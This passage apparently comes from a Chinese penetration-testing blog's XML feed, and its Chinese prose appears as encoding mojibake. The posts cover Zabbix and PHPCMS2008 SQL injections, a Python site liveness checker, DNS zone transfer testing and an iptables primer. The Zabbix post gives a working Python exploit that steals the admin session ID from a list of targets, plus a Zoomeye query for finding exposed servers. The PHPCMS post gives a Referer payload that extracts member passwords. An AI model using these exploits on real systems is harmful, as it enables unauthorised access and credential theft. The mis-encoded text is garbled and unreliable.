    <content type="text"><![CDATA[0x00 æ¼æ´æ¦‚è¿°Zabbixæ˜¯ä¸€ä¸ªå¼€æºçš„ä¼ä¸šçº§æ€§èƒ½ç›‘æ§è§£å†³æ–¹æ¡ˆã€‚zabbixçš„jsrpcçš„profileIdx2å‚æ•°å­˜åœ¨insertæ–¹å¼çš„SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€æˆæƒç™»é™†å³å¯ç™»é™†zabbixç®¡ç†ç³»ç»Ÿï¼Œä¹Ÿå¯é€šè¿‡scriptç­‰åŠŸèƒ½è½»æ˜“ç›´æ¥è·å–zabbixæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæƒé™ã€‚ ä½†æ˜¯æ— éœ€ç™»å½•æ³¨å…¥è¿™é‡Œæœ‰ä¸ªå‰æï¼Œå°±æ˜¯zabbixå¼€å¯äº†guestæƒé™ã€‚è€Œåœ¨zabbixä¸­ï¼Œguestçš„é»˜è®¤å¯†ç ä¸ºç©ºã€‚éœ€è¦æœ‰è¿™ä¸ªæ¡ä»¶çš„æ”¯æŒæ‰å¯ä»¥è¿›è¡Œæ— æƒé™æ³¨å…¥ã€‚ 0x01 å½±å“ç¨‹åº¦æ”»å‡»æˆæœ¬ï¼šä½ å±å®³ç¨‹åº¦ï¼šé«˜ æ˜¯å¦ç™»é™†ï¼šä¸éœ€è¦ å½±å“èŒƒå›´ï¼š2.2.x, 3.0.0-3.0.3ã€‚ï¼ˆæ‘˜è‡ªFreebufï¼‰ 0x02 æ¼æ´æµ‹è¯•åœ¨Zabbixä¸­æœ‰ä¸¤ä¸ªæ–‡ä»¶å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œåˆ†åˆ«æ˜¯jsrpc.phpå’Œlatest.phpï¼Œå­˜åœ¨æ¼æ´å‚æ•°åˆ†åˆ«ä¸ºï¼šprofileIdx2å’Œtoggle_idsã€‚ åœ¨ç›®æ ‡çš„zabbixçš„åœ°å€åé¢åŠ ä¸Šå¦‚ä¸‹POCï¼š 123456/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2&apos;666&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1 è‹¥è¿”å›é¡µé¢å‡ºç°You have an error in your SQL syntaxåˆ™è¯æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚ æ¼æ´EXPï¼š123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šw2n1ck@åšå®¢ï¼šhttp://byd.dropsec.xyz/&apos;&apos;&apos;import urllib,sys,urllib2,urllibdef cookie(url): poc=&apos;/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=(select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y)&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=&apos; body= urllib.urlopen(url+poc).read() cookie=body.split(&apos;Duplicate entry&apos;)[1].split(&apos;for key&apos;)[0][3:-2] return cookiedef test(cookie,url): url=url+&apos;proxies.php&apos; req=urllib2.Request(url) cook=&quot;zbx_sessionid=%s&quot; % cookie req.add_header(&apos;Cookie&apos;, cook) response=urllib2.urlopen(req) data=response.read() if data.find(&apos;Access denied.&apos;) &lt; 0: print &quot;OK--&gt;&quot;,cookie else: print &apos;ERROR&apos;if len(sys.argv)==4: for i in open(sys.argv[3]).readlines(): print i test(cookie(i),i)else: print sys.argv[1] test(cookie(sys.argv[1]),sys.argv[1]) è®¾è®¡æ­¥éª¤ï¼šé¦–å…ˆæŸ¥è¯¢çš„sqlè¯­å¥ä¸ºï¼šselect 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y æŸ¥è¯¢çš„sessionidä¼šåœ¨é¡µé¢ä¸­æ˜¾ç¤º ç„¶åé€šè¿‡body.split(&#39;Duplicate entry&#39;)[1].split(&#39;for key&#39;)[0][3:-2]æ¥å–å‡ºsessionidçš„å€¼,å…·ä½“çš„å¯ä»¥çœ‹å“åº”çš„é¡µé¢ç»“æ„ ç„¶åå¸¦å…¥cookieè®¿é—®proxies.phpï¼Œå¦‚æœæ²¡æœ‰å‡ºç°Access denied. åˆ™è¯´æ˜è¿›å…¥æˆåŠŸï¼Œè¾“å‡ºsessionidçš„å€¼ å‚è€ƒ:ç‹¬è‡ªç­‰å¾…åšå®¢EXP 0x03 æ¼æ´ä¿®å¤1ã€ç¦ç”¨åå°ç”¨æˆ·guestè´¦å·ï¼ˆæ³¨å…¥è¦æ±‚æ­¤è´¦å·å¯ç”¨ï¼‰ã€‚ 2ã€å‡çº§åˆ°zabbixçš„æœ€æ–°ç‰ˆã€‚ 0x04 æ‰¹é‡æŸ¥æ‰¾ä¸ŠZoomeyeï¼Œè¾“å…¥æŸ¥è¯¢å…³é”®å­—:Zabbix port:80ï¼Œå½“ç„¶ï¼Œå¦‚æœä½ æƒ³å®šç‚¹æŸ¥è¯¢çš„è¯è¿˜å¯ä»¥åŠ ä¸Šcountry: City:ç­‰å­—æ®µï¼Œæ¯”å¦‚æŸ¥è¯¢åŒ—äº¬Zabbix country:china port:80 city:Beijing;]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPCMS2008å¹¿å‘Šæ¨¡æ¿SQLæ³¨å…¥æ¼æ´]]></title>
    <url>%2F2016%2F09%2F22%2FPHPCMS2008%E5%B9%BF%E5%91%8A%E6%A8%A1%E6%9D%BFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 æ¼æ´æè¿°PHPCMS2008ç”±äºå¹¿å‘Šæ¨¡å—å–refererä¸ä¸¥ï¼Œå¯¼è‡´ä¸€å¤„sqlæ³¨å…¥æ¼æ´.å¯ä»¥å¾—åˆ°ç®¡ç†å‘˜ç”¨æˆ·åä¸å¯†ç ï¼Œæ”»å‡»è€…ç™»å½•åå°åå¯èƒ½ä¼šè·å–webshellï¼Œå¯¹æœåŠ¡å™¨è¿›è¡Œè¿›ä¸€æ­¥çš„æ¸—é€ã€‚ 0x01 æ¼æ´åˆ†ææ¼æ´äº§ç”Ÿçš„ä½ç½®ï¼š/ads/include/ads_place.class.phpçš„showæ–¹æ³•ä¸­. 123456789101112function show($placeid) ... if($adses[0][&apos;option&apos;]) &#123; foreach($adses as $ads) &#123; $contents[] = ads_content($ads, 1); $this-&gt;db-&gt;query(â€œINSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (â€˜$ads[adsid]â€™,â€™$_usernameâ€™,â€™$ipâ€™,â€˜$this-&gt;referrerâ€™,â€˜$timeâ€™,,â€™0â€™)â€); $template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;; &#125; &#125; ... sqlè¯­å¥ä¸­ 1$this-&gt;db-&gt;query(â€œINSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (â€˜$ads[adsid]â€™,â€™$_usernameâ€™,â€™$ipâ€™,â€˜$this-&gt;referrerâ€™,â€˜$timeâ€™,,â€™0â€™)â€); è¿™é‡Œ$this-&gt;referreré€šè¿‡thisæ–¹æ³•ç›´æ¥å°†HTTPè¯·æ±‚å¤´ä¸­çš„refererå­—æ®µæ’å…¥åˆ°æ•°æ®åº“ä¸­,æ²¡æœ‰åšä»»ä½•è¿‡æ»¤æªæ–½ã€‚(è¿™ä¸ªthisæ–¹æ³•æ˜¯PHPCMSé‡Œé¢ç›´æ¥å°è£…çš„)ã€‚ æ‰€ä»¥ç°åœ¨å·²ç»æ‰¾åˆ°æ¼æ´ç‚¹ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åŒ…å«æ¼æ´çš„ç”¨æˆ·å¯æ§çš„é¡µé¢ã€‚å¦‚æœæ¼æ´æ˜¯ç”¨æˆ·ä¸å¯æ§çš„ï¼Œæ¯”å¦‚åªèƒ½ç®¡ç†å‘˜åˆ©ç”¨ï¼Œé‚£å°±ç›¸å½“çš„é¸¡è‚‹äº†ã€‚ è¿™é‡Œä½¿ç”¨å›æº¯çš„æ–¹æ³•ï¼Œçœ‹çœ‹å“ªäº›é¡µé¢è°ƒç”¨äº†å®ƒã€‚ é¡µé¢/ads/include/commom.inc.php 123456&lt;?php ...require MOD_ROOT.&apos;include/ads_place.class.php&apos;;require MOD_ROOT.&apos;include/ads.class.php&apos;;...?&gt; åœ¨å¾€ä¸Šçœ‹çœ‹è°è°ƒç”¨äº†/ads/include/commom.inc.php /ads/ad.phpæ–‡ä»¶ä¸­ 12345&lt;?php...require &apos;./include/common.inc.php&apos;;...?&gt; ad.phpæ–‡ä»¶ä¸ºç”¨æˆ·å¯æ§æ–‡ä»¶ï¼Œä½†ad.phpæœ‰æ—¶ä¸èƒ½è®¿é—®ï¼Œç»§ç»­å‘ä¸ŠæŸ¥æ‰¾/data/js.php 1234&lt;?phpchdir(â€˜../ads/â€™);require â€˜./ad.phpâ€™;?&gt; åœ¨ç”¨æˆ·è®¿é—®é¦–é¡µæ—¶ï¼Œä¼šè°ƒç”¨js.phpï¼Œé€šè¿‡è¯¥æ–‡ä»¶å¯ä»¥æäº¤æœ‰å®³å­—æ®µï¼Œç„¶åé€šè¿‡é€å±‚è°ƒç”¨ï¼Œä¼ å…¥å­—æ®µrefereråˆ°å±é™©æ–¹æ³•showï¼Œå¼•å…¥SQLæ³¨å…¥æ”»å‡»ã€‚ 0x02 æ¼æ´åˆ©ç”¨ä¿®æ”¹è¯·æ±‚å¤´ä¸­çš„refererå­—æ®µçš„è¯æœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚burpsuiteï¼ŒTamper Dataâ€¦ è¿™é‡Œç›´æ¥ä½¿ç”¨ç«ç‹çš„Tamper Dataè¿›è¡Œä¿®æ”¹ï¼š ç‚¹å‡»Start Tamper,ç„¶åè®¿é—®http://your-addr/data/js.php?id=1 è¿™æ—¶å€™Tamper Dataä¼šè·³å‡ºæ¥,åœ¨å³è¾¹æ¡†å†…ï¼Œç‚¹å‡»å³é”®ï¼Œæ·»åŠ ä¸€ä¸ªelementå€¼å¡«å†™payload referer=1â€™, (SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), â€˜0â€™)# è¿™é‡Œæˆ‘è§£é‡Šä¸€ä¸‹ï¼šå› ä¸ºæ¼æ´çš„sqlè¯­å¥æ˜¯INSERTæ˜¯ä¸å›æ˜¾çš„ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç›²æ³¨ï¼Œè¿™é‡Œçš„payloadä½¿ç”¨çš„flooræŠ¥é”™æ³¨å…¥ã€‚flooræŠ¥é”™æ³¨å…¥åŸç†è¯·å‚è€ƒï¼šfloorå‡½æ•°ç”¨æ³• æŠŠè¿™ä¸ªpayloadå¸¦å…¥sqlè¯­å¥ä¸­æ˜¯ï¼š 1$this-&gt;db-&gt;query(â€œINSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (â€˜$ads[adsid]â€™,â€™$_usernameâ€™,â€™$ipâ€™,â€˜1â€™,â€˜$timeâ€™,(SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), â€˜0â€™)#,â€™0â€™)â€); 0x03 æ¼æ´ä¿®å¤å¯¹ç›¸å…³å­—æ®µè¿›è¡Œè¿‡æ»¤å¤„ç†ã€‚ 123$referer = safe_replace($this-&gt;referer); $this-&gt;db-&gt;query(&quot;INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES (&apos;$ads[adsid]&apos;, &apos;$_username&apos;, &apos;$ip&apos;, &apos;$referer&apos;, &apos;$time&apos;, &apos;0&apos;)&quot;);$template = $ads[&apos;template&apos;] ? $ads[&apos;template&apos;] : &apos;ads&apos;; è¿™é‡Œsafe_replaceæ˜¯PHPCMS2008å°è£…çš„è¿‡æ»¤å‡½æ•°ã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå®ç°æ‰¹é‡ç½‘ç«™å­˜æ´»æ£€æµ‹]]></title>
    <url>%2F2016%2F09%2F21%2FPython%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E7%BD%91%E7%AB%99%E5%AD%98%E6%B4%BB%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[åšæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œæœ‰ä¸ªæ¯”è¾ƒå¤§çš„é¡¹ç›®ï¼Œé‡Œé¢æœ‰å‡ ç™¾ä¸ªç½‘ç«™ï¼Œè¿™æ ·ä½ å¿…é¡»é¦–å…ˆç¡®å®šå“ªäº›ç½‘ç«™æ˜¯æ­£å¸¸ï¼Œå“ªäº›ç½‘ç«™æ˜¯ä¸æ­£å¸¸çš„ã€‚æ‰€ä»¥è‡ªå·±å°±ç¼–äº†ä¸€ä¸ªå°è„šæœ¬ï¼Œä¸ºä»¥åæ–¹ä¾¿ä½¿ç”¨ã€‚ å…·ä½“å®ç°çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Authorï¼šw2n1ck@åšå®¢ï¼šhttp://byd.dropsec.xyz/&apos;&apos;&apos;import requestsimport sysf = open(&apos;url.txt&apos;, &apos;r&apos;)url = f.readlines()length = len(url)url_result_success=[]url_result_failed=[]for i in range(0,length): try: response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5) if response.status_code != 200: raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code)) except requests.RequestException as e: url_result_failed.append(url[i]) continue url_result_success.append(url[i])f.close()result_len = len(url_result_success)for i in range(0,result_len): print &apos;ç½‘å€%s&apos; % url_result_success[i].strip()+&apos;æ‰“å¼€æˆåŠŸ&apos; æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š é‡åˆ°çš„é—®é¢˜ï¼š åˆšå¼€å§‹æµ‹è¯•çš„æ—¶å€™ï¼Œé‡åˆ°åªè¦æ˜¯ä¸èƒ½é”™è¯¯ï¼Œæˆ–è€…ä¸å­˜åœ¨çš„ï¼Œç›´æ¥æŠ¥é”™åœæ­¢ç¨‹åºã€‚åæ¥å‘ç°æ˜¯å› ä¸ºresponse.status_code != 200è¿™é‡Œå–çŠ¶æ€ç çš„æ—¶å€™é”™è¯¯ã€‚ å› ä¸ºæœ‰çš„ç½‘ç«™ä¸èƒ½æ‰“å¼€çš„è¯ï¼Œä¸ä¼šè¿”å›çŠ¶æ€ç ã€‚æ‰€ä»¥ç¨‹åºå°±ä¸çŸ¥é“ï¼==200æ€ä¹ˆå¤„ç†äº†ã€‚ è§£å†³æ–¹æ³•ï¼š ä½¿ç”¨try except elseæ•æ‰å¼‚å¸¸ å…·ä½“ä»£ç ä¸ºï¼š 1234567try: response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5) if response.status_code != 200: raise requests.RequestException(u&quot;Status code error: &#123;&#125;&quot;.format(response.status_code)) except requests.RequestException as e: url_result_failed.append(url[i]) continue]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>Python</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNSåŸŸä¼ é€æ¼æ´]]></title>
    <url>%2F2016%2F09%2F20%2FDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[DNSæ˜¯ç½‘ç»œä¸­åº”ç”¨éå¸¸å¹¿æ³›çš„æœåŠ¡ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§åº•å±‚çš„ç½‘ç»œåŸºç¡€æœåŠ¡ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯æä¾›åŸŸåï¼ˆå¦‚baidu.comï¼‰å’ŒIPç›´æ¥è§£æå…³ç³»çš„åŠŸèƒ½ï¼Œåªè¦æˆ‘ä»¬çš„ç½‘ç»œé€šä¿¡ä¸­å­˜åœ¨åŸŸåï¼Œå°±ä¼šæ¶‰åŠåˆ°DNSæœåŠ¡ã€‚DNSåŒºåŸŸä¼ é€ï¼ˆDNS zone transferï¼‰æŒ‡çš„æ˜¯ä¸€å°å¤‡ç”¨æœåŠ¡å™¨ä½¿ç”¨æ¥è‡ªä¸»æœåŠ¡å™¨çš„æ•°æ®åˆ·æ–°è‡ªå·±çš„åŸŸï¼ˆzoneï¼‰æ•°æ®åº“ã€‚è¿™ä¸ºè¿è¡Œä¸­çš„DNSæœåŠ¡æä¾›äº†ä¸€å®šçš„å†—ä½™åº¦ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ä¸»çš„åŸŸåæœåŠ¡å™¨å› æ„å¤–æ•…éšœå˜å¾—ä¸å¯ç”¨æ—¶å½±å“åˆ°æ•´ä¸ªåŸŸåçš„è§£æã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒDNSåŒºåŸŸä¼ é€æ“ä½œåªåœ¨ç½‘ç»œé‡ŒçœŸçš„æœ‰å¤‡ç”¨åŸŸåDNSæœåŠ¡å™¨æ—¶æ‰æœ‰å¿…è¦ç”¨åˆ°ï¼Œä½†è®¸å¤šDNSæœåŠ¡å™¨å´è¢«é”™è¯¯åœ°é…ç½®æˆåªè¦æœ‰clientå‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šå‘å¯¹æ–¹æä¾›ä¸€ä¸ªzoneæ•°æ®åº“çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‰€ä»¥è¯´å…è®¸ä¸å—ä¿¡ä»»çš„å› ç‰¹ç½‘ç”¨æˆ·æ‰§è¡ŒDNSåŒºåŸŸä¼ é€ï¼ˆzone transferï¼‰æ“ä½œæ˜¯åæœæœ€ä¸ºä¸¥é‡çš„é”™è¯¯é…ç½®ä¹‹ä¸€ã€‚ ç®€å•ç‚¹è¯´å°±æ˜¯DNSæœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥å°†è¯¥DNSæœåŠ¡å™¨ä¸Šçš„æ•°æ®ä¼ é€åˆ°å…¶ä»–çš„ä¸»æœºä¸Šã€‚æ¶æ„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ­¤ç§æ–¹æ³•ï¼Œè·å–æŸä¸ªåŸŸåçš„æ‰€æœ‰å­åŸŸååŠå¯¹åº”IPåœ°å€ã€‚ æµ‹è¯•æ–¹æ³•1ã€Linux digæµ‹è¯•æ–¹æ³•digæ˜¯Linuxä¸Šå¸¸ç”¨çš„dnså·¥å…·ï¼Œå¦‚æœæ²¡æœ‰æ­¤å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…ï¼ˆCentosç³»ç»Ÿï¼‰ï¼š yum install bind-utils ä½¿ç”¨digè¿›è¡ŒDNSåŸŸä¼ é€ï¼Œé¦–å…ˆè¦æ‰¾åˆ°ä¸»æœºçš„SOAæˆ–è€…NSè®°å½•ï¼š 12345678910111213141516171819[root@user ~]# dig soa xxx.com ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; soa 3mc2.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 2865;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION:;3mc2.com. IN SOA ;; ANSWER SECTION:xxx.com. 600 IN SOA f1g1ns1.dnspod.net. freednsadmin.dnspod.com. 1411491105 3600 180 1209600 180 ;; Query time: 504 msec;; SERVER: 223.5.5.5#53(223.5.5.5);; WHEN: Wed Mar 11 11:26:05 2015;; MSG SIZE rcvd: 100 æ˜¾ç¤ºç»“æœå¿½ç•¥æ³¨é‡Šéƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°SOAè®°å½•æœ‰ä¸¤ä¸ªæœåŠ¡å™¨ï¼šf1g1ns1.dnspod.net å’Œ freednsadmin.dnspod.comï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹DNSæ˜¯å¦å­˜åœ¨DNSåŸŸä¼ é€æ¼æ´ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å¯ä»¥æ‰¾åˆ°xxx.comçš„æ‰€æœ‰å­åŸŸåå’ŒIPå¯¹åº”å…³ç³»ï¼š 12345[root@user ~]# dig axfr xxx.com @f1g1ns1.dnspod.net ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; axfr xxx.com @f1g1ns1.dnspod.net;; global options: +cmd; Transfer failed. ä»¥ä¸Šæ˜¯ä¸èƒ½è¿›è¡ŒDNSåŸŸä¼ é€çš„ç»“æœï¼Œä¸‹å›¾æ˜¯å¯ä»¥è¿›è¡ŒDNSåŸŸä¼ é€çš„ç»“æœï¼š 2ã€Windows nslookupå‘½ä»¤nslookupæ˜¯windowsä¸‹è‡ªå¸¦çš„DNSæµ‹è¯•å·¥å…·ï¼Œå¯ä»¥é€šè¿‡æ­¤å‘½ä»¤è¿›è¡ŒDNSåŸŸä¼ é€æµ‹è¯•ï¼š ä¸»è¦æ–¹æ³•å’Œdigç±»ä¼¼ï¼Œå…ˆæ‰¾å‡ºnsæœåŠ¡å™¨ï¼Œç„¶åæ‰§è¡Œls -d åˆ—å‡ºå­åŸŸç­‰ä¿¡æ¯ï¼ˆä»¥ä¸‹æ˜¯ä¸èƒ½ä¼ é€çš„æƒ…å½¢ï¼‰ï¼š 123456789101112131415161718192021222324[c:\~]$ nslookupé»˜è®¤æœåŠ¡å™¨: public1.alidns.comAddress: 223.5.5.5 &gt; set type=ns&gt; xxx.coméæƒå¨åº”ç­”:æœåŠ¡å™¨: public1.alidns.comAddress: 223.5.5.5 xxx.com nameserver = f1g1ns1.dnspod.netxxx.com nameserver = f1g1ns2.dnspod.net&gt; server f1g1ns2.dnspod.neté»˜è®¤æœåŠ¡å™¨: f1g1ns2.dnspod.netAddresses: 115.236.137.40 112.90.82.194 101.226.30.224 182.140.167.188&gt; set type=any&gt; ls -d 3mc2.com*** æ— æ³•åˆ—å‡ºåŸŸ xxx.com: BAD ERROR VALUEDNS æœåŠ¡å™¨æ‹’ç»å°†åŒºåŸŸ 3mc2.com ä¼ é€åˆ°æ‚¨çš„è®¡ç®—æœºã€‚å¦‚æœè¿™ä¸æ­£ç¡®ï¼Œè¯·æ£€æŸ¥ IP åœ°å€ 223.5.5.5 çš„ DNS æœåŠ¡å™¨ä¸Š 3mc2.com çš„åŒºåŸŸä¼ é€å®‰å…¨è®¾ç½®ã€‚ æ­£å¸¸å­˜åœ¨DNSåŸŸä¼ é€æ¼æ´çš„è¿”å›ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š 3ã€ä½¿ç”¨dnsenum.plå’ŒDnswalkæµ‹è¯•ï¼šç°æˆå·¥å…·ï¼Œä¸åšä»‹ç»ï¼ŒKalié‡Œè¾¹æœ‰]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
        <tag>DNSåŸŸä¼ é€</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPtableså…¥é—¨æ•™ç¨‹]]></title>
    <url>%2F2016%2F09%2F03%2FIPtables%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 iptablesä»‹ç»é˜²ç«å¢™ï¼Œå…¶å®è¯´ç™½äº†è®²ï¼Œå°±æ˜¯ç”¨äºå®ç°Linuxä¸‹è®¿é—®æ§åˆ¶çš„åŠŸèƒ½çš„ï¼Œå®ƒåˆ†ä¸ºç¡¬ä»¶çš„æˆ–è€…è½¯ä»¶çš„é˜²ç«å¢™ä¸¤ç§ã€‚æ— è®ºæ˜¯åœ¨å“ªä¸ªç½‘ç»œä¸­ï¼Œé˜²ç«å¢™å·¥ä½œçš„åœ°æ–¹ä¸€å®šæ˜¯åœ¨ç½‘ç»œçš„è¾¹ç¼˜ã€‚è€Œæˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯éœ€è¦å»å®šä¹‰åˆ°åº•é˜²ç«å¢™å¦‚ä½•å·¥ä½œï¼Œè¿™å°±æ˜¯é˜²ç«å¢™çš„ç­–ç•¥ï¼Œè§„åˆ™ï¼Œä»¥è¾¾åˆ°è®©å®ƒå¯¹å‡ºå…¥ç½‘ç»œçš„IPã€æ•°æ®è¿›è¡Œæ£€æµ‹ã€‚ linuxçš„åŒ…è¿‡æ»¤åŠŸèƒ½ï¼Œå³linuxé˜²ç«å¢™ï¼Œå®ƒç”±netfilter å’Œ iptables ä¸¤ä¸ªç»„ä»¶ç»„æˆã€‚ netfilter ç»„ä»¶ä¹Ÿç§°ä¸ºå†…æ ¸ç©ºé—´ï¼Œæ˜¯å†…æ ¸çš„ä¸€éƒ¨åˆ†ï¼Œç”±ä¸€äº›ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ç»„æˆï¼Œè¿™äº›è¡¨åŒ…å«å†…æ ¸ç”¨æ¥æ§åˆ¶ä¿¡æ¯åŒ…è¿‡æ»¤å¤„ç†çš„è§„åˆ™é›†ã€‚ iptables ç»„ä»¶æ˜¯ä¸€ç§å·¥å…·ï¼Œä¹Ÿç§°ä¸ºç”¨æˆ·ç©ºé—´ï¼Œå®ƒä½¿æ’å…¥ã€ä¿®æ”¹å’Œé™¤å»ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­çš„è§„åˆ™å˜å¾—å®¹æ˜“ã€‚ 0x01 iptablesçš„ç»“æ„iptablesçš„ç»“æ„ï¼š iptables -&gt; Tables -&gt; Chains -&gt; Rulesç®€å•åœ°è®²ï¼Œtablesç”±chainsç»„æˆï¼Œè€Œchainsåˆç”±rulesç»„æˆã€‚iptables é»˜è®¤æœ‰å››ä¸ªè¡¨Filter, NAT, Mangle, Rawï¼Œå…¶å¯¹äºçš„é“¾å¦‚ä¸‹å›¾ 0x02 filterè¡¨è¯¦è§£1. åœ¨iptablesä¸­ï¼Œfilterè¡¨èµ·è¿‡æ»¤æ•°æ®åŒ…çš„åŠŸèƒ½ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ä¸‰ç§å†…å»ºé“¾ï¼š INPUTé“¾ â€“ å¤„ç†æ¥è‡ªå¤–éƒ¨çš„æ•°æ®ã€‚ OUTPUTé“¾ â€“ å¤„ç†å‘å¤–å‘é€çš„æ•°æ®ã€‚ FORWARDé“¾ â€“ å°†æ•°æ®è½¬å‘åˆ°æœ¬æœºçš„å…¶ä»–ç½‘å¡è®¾å¤‡ä¸Šã€‚ 2. æ•°æ®æµå‘åœºæ™¯ è®¿é—®æœ¬æœºï¼šåœ¨INPUTé“¾ä¸Šåšè¿‡æ»¤ æœ¬æœºè®¿é—®å¤–éƒ¨ï¼šåœ¨OUTPUTé“¾ä¸Šåšè¿‡æ»¤ é€šè¿‡æœ¬æœºè®¿é—®å…¶ä»–ä¸»æœº:åœ¨FORWARDé“¾ä¸Šåšè¿‡æ»¤ 3. IptablesåŸºæœ¬æ“ä½œ å¯åŠ¨iptablesï¼šservice iptables start å…³é—­iptablesï¼šservice iptables stop é‡å¯iptablesï¼šservice iptables restart æŸ¥çœ‹iptablesçŠ¶æ€ï¼šservice iptables status ä¿å­˜iptablesé…ç½®ï¼šservice iptables save IptablesæœåŠ¡é…ç½®æ–‡ä»¶ï¼š/etc/sysconfig/iptables-config Iptablesè§„åˆ™ä¿å­˜æ–‡ä»¶ï¼š/etc/sysconfig/iptables æ‰“å¼€iptablesè½¬å‘ï¼šecho â€œ1â€&gt; /proc/sys/net/ipv4/ip_forward 0x03 iptableså‘½ä»¤å‚è€ƒå‘½ä»¤ï¼š iptables [ -t è¡¨å] å‘½ä»¤é€‰é¡¹ [é“¾å] [æ¡ä»¶åŒ¹é…] [-j ç›®æ ‡åŠ¨ä½œæˆ–è·³è½¬] 1. è¡¨å è¡¨åï¼šFilter, NAT, Mangle, Raw 